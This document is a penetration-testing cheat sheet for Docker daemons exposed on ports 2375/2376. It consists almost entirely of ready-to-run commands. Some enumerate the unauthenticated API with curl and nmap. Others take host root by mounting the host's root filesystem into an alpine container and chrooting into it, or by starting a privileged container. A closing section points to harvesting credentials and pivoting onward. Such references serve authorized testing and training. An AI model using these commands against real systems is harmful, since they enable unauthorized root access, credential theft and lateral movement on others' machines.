# 2375/2376 - Docker API

## Service Usage

Query daemon version (unauth on 2375)
```bash
curl -s http://$ip:2375/version
```
List running containers via docker client
```bash
docker -H tcp://$ip:2375 ps -a
```

## 0. Fast Path (try these first)

Check if the daemon is exposed with no auth
```bash
curl -s http://$ip:2375/version
```
If it returns JSON with "ApiVersion", you have root on the box.

## 1. Banner Grab & Unauthenticated Enumeration

Version and default-script scan
```bash
nmap -p 2375,2376 -sV -sC $ip
```
Get daemon info manually
```bash
curl -s http://$ip:2375/info
```
List containers manually
```bash
curl -s http://$ip:2375/containers/json
```

## 2. Authenticated Enumeration

List images via docker client
```bash
docker -H tcp://$ip:2375 images
```
List all containers via docker client
```bash
docker -H tcp://$ip:2375 ps -a
```

## 3. Password Spraying / Bruteforcing

N/A — either the API is open (no auth) or it uses client certs (2376).

## 5. Quick Wins

### 5.1 Unauthenticated Docker → instant root
```bash
docker -H tcp://$ip:2375 run -it -v /:/mnt alpine chroot /mnt sh
# or just exec into a running root container
docker -H tcp://$ip:2375 exec -it <container_id> sh
```

### 5.2 Pull a privileged container
```bash
docker -H tcp://$ip:2375 run --rm -it --privileged -v /:/host alpine sh
# then: chroot /host
```

## 6. Config Paths

Docker daemon
```text
/etc/docker/daemon.json
/etc/systemd/system/docker.service
```
TLS certs (for 2376)
```text
~/.docker/ca.pem, cert.pem, key.pem
```

Config quick-reference:
```text
daemon.json -> "hosts": ["tcp://0.0.0.0:2375"], tls settings
```

## 7. Post-Exploit / Pivot

- Docker API → root on host (mount /, chroot)
- Host filesystem → creds → reuse/pivot

### Common gotchas
```text
- 2375 plaintext = no auth = instant root. 2376 = TLS, needs client certs (you likely don't have them).
- Always test /version first — it's the cleanest signal.
```
